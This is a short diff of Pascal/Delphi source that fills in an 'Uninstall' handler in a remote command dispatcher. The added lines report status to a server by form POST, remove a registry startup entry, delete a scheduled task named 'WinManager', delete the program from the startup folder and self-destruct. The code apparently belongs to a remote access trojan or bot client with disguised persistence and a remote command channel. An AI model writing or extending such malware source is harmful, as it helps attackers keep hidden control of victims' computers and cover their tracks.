@@ -223,7 +223,14 @@ Begin
       end;
     end;
     'Uninstall': Begin
-
+      ToPost.AddFormField('RT', '1');
+      ToPost.AddFormField('Result','Uninstalling...');
+      DoPost;
+      Reg_RemoveFromStartup;
+      DeleteTask('WinManager');
+      ChDel(StartupFolder+'\'+InternalName);
+      Selfdestruct;
+      Halt(0);
     end;
     'Upload': Begin
       ToPost.AddFormField('RT', '2');
